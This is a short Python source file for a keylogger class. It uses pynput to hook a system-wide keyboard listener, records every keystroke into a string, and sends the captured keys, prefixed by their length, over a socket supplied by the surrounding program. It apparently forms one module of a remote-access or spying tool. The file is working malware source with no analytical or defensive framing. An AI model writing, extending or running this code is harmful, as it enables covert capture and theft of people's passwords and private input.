from pynput.keyboard import Listener,Key
import time

class Keylog:
    def __init__(self,sk):
        self.sk=sk
        self.keystring=None
        self.is_hook=None
        self.keys=""
    def hook(self):
        if self.is_hook: return
        self.is_hook=True
        self.listener=Listener(on_press=self.on_press)
        self.listener.start()
    def on_press(self,key):
        #self.sk.client.sendall(bytes("press",'utf8'))
        self.keys+=str(format(key))
    def un_hook(self):
        if not self.is_hook:return
        self.listener.stop()
        self.is_hook=False
    def send_keys(self):
        self.sk.sendall(bytes(str(len(self.keys)),'utf8'))
        self.sk.sendall(bytes(str(self.keys),"utf8"))
    def delete_keys(self):
        self.keys=""


        